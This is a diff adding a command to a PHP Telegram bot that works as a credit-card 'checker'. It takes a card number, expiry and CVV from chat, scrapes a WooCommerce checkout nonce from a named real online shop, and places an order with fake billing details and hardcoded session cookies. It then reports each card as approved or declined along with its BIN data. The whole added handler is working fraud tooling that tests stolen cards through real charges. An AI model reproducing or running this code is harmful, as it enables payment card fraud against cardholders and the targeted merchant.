@@ -2021,6 +2021,289 @@ if ($live) {
 ob_flush();
 
 }
+
+
+
+elseif((strpos($message, "!na") === 0)||(strpos($message, "/na") === 0)||(strpos($message, ".na") === 0)){
+$lista = substr($message, 4);
+$i = preg_split('/[|:| ]/', $lista);
+$cc    = $i[0];
+$mes   = $i[1];
+$ano   = $i[2];
+//$ano  = trim(substr($i[2], -2));
+$cvv   = $i[3];
+
+if (strlen($ano) == 2) {
+    $ano = '20' . $ano;
+}
+
+
+$bin = substr($lista, 0, 6);
+$num = "$cc$mes$ano1$cvv";
+//-----------------------------------------------------//       $verify = substr($cc, 16, 1);                                   if($verify != ""){
+$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
+sendMessage($chat_id,$respuesta, $message_id);
+die();
+}
+
+if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+}else{
+$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /na cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !na cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .na cc|m|y|cvv\n";
+sendMessage($chat_id,$respuesta, $message_id);
+        die();
+}
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+        sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+        //----------------------------------------------------//
+
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$BinData = BinData($bin); //Extrae los datos del bin
+
+
+
+///SACA EL NONCE//
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.naturexnauts.com/checkout/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'x-requested-with: XMLHttpRequest',
+    'referer: https://www.naturexnauts.com/checkout/',
+  ],
+]);
+
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
+preg_match($patron, $response, $coincidencias);
+$nonce = $coincidencias[1];
+curl_close($curl);
+
+
+if (empty($nonce)) {
+//    echo "Se agrega un producto al carrito\n";
+////Agrega el producto al carrito///
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.naturexnauts.com/product/mc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => [
+    'quantity' => '1',
+    'add-to-cart' => '125136',
+  ],
+  CURLOPT_COOKIE => 'wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2023%3A54%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F; sbjs_first_add=fd%3D2024-11-03%2023%3A54%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F; shop_display=grid',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'origin: https://www.naturexnauts.com',
+//    'content-type: multipart/form-data; boundary=----WebKitFormBoundarysB6JgnsfL19hB00B',
+    'referer: https://www.naturexnauts.com/product/mc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$patron = '/&ldquo;.*&rdquo;\s*(.*)/';
+preg_match($patron, $response, $coincidencias);
+$texto_necesario = trim($coincidencias[1]);
+curl_close($curl);
+//echo "$texto_necesario\n"; // Salida: has been added to your cart
+
+
+////SACA EL NONCE///
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.naturexnauts.com/checkout/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'x-requested-with: XMLHttpRequest',
+    'referer: https://www.naturexnauts.com/checkout/',
+  ],
+]);
+
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
+preg_match($patron, $response, $coincidencias);
+$nonce = $coincidencias[1];
+curl_close($curl);
+
+
+
+} else {
+//    echo "El carrito contiene producto";
+///POR SI EO CARRO YA TIENE PRODUCTO////
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.naturexnauts.com/checkout/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'x-requested-with: XMLHttpRequest',
+    'referer: https://www.naturexnauts.com/checkout/',
+  ],
+]);
+
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+
+$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
+preg_match($patron, $response, $coincidencias);
+$nonce = $coincidencias[1];
+
+curl_close($curl);
+//echo "$nonce";
+
+}
+
+
+
+////Extrae el link/////
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.naturexnauts.com?wc-ajax=checkout',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.naturexnauts.com%2F&wc_order_attribution_session_start_time=2024-11-03+22%3A27%3A04&wc_order_attribution_session_pages=18&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F130.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=AZ&billing_postcode=10010&billing_phone=4179204022&billing_email=Dausitherer%40cuvox.de&shipping_first_name=Carlos&shipping_last_name=Perez&shipping_company=&shipping_country=US&shipping_address_1=6195+bollinger+rd&shipping_address_2=&shipping_city=New+york&shipping_state=AZ&shipping_postcode=10010&order_comments=&shipping_method%5B0%5D=flexible_shipping_single%3A1&payment_method=mallpay_new&mallpay_new_card_number='.$cc.'&mallpay_new_clientIP=&cardpay_time_zone=-6&checkout_time=&mallpay_new_card_expiration_month='.$mes.'&mallpay_new_card_expiration_year='.$ano.'&mallpay_new_card_csc='.$cvv.'&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'x-requested-with: XMLHttpRequest',
+    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+    'origin: https://www.naturexnauts.com',
+    'referer: https://www.naturexnauts.com/checkout/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$link = $json["redirect"];
+///EXTRAE EL MONTO///
+$patron = '/orderAmount=(\d+\.\d+)/';
+preg_match($patron, $response, $coincidencias);
+//if (!empty($coincidencias)) {
+    $monto = $coincidencias[1] . '$'; // Concatenamos el símbol>
+//    echo $monto; // Salida: 39.99$
+//} else {
+
+//echo "$response\n\n";
+$response1 = $response;
+curl_close($curl);
+
+
+
+////HACE LA COMPRA///
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => $link,
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'referer: https://www.naturexnauts.com/checkout/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+///EXTRE EL MENSAJE COMPLETO///
+$patron = '/Payment Information: (.*)<\/li>/';
+preg_match($patron, $response, $coincidencias);
+$payment_info = $coincidencias[1];
+///EXTRE EL MENSAGE CON CODIGOS///
+$patron = '/:(.*)\,/';
+preg_match($patron, $payment_info, $coincidencias);
+$respo1 = trim($coincidencias[1]);
+//Extrae el mensaje
+$patron = '/[\d:|]/';
+$respo = preg_replace($patron, '', $respo1);
+curl_close($curl);
+
+//echo "CODE: $respo - $monto\n";
+
+
+///VERIFICA EL TINPO DE PROCESAMIENTO///
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+if (empty($respo)) {
+        $respo = $response1;
+}
+
+// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Shopify (".$monto.")\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $live = True;
+} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Your card was declined.') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction refused') !== false) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Shopify (".$monto.")\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $live = False;
+} else {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR  ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Shopify (".$monto.")\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+    $live = False;
+}
+
+if ($live) {
+    //echo "$respuesta\n";
+    editMessage($chat_id, $respuesta, $id_text);
+} else {
+    //echo "$respuesta\n";
+    editMessage($chat_id, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+
+}
+
+	
 	
 elseif((strpos($message, "!he") === 0)||(strpos($message, "/he") === 0)||(strpos($message, ".he") === 0)){
 
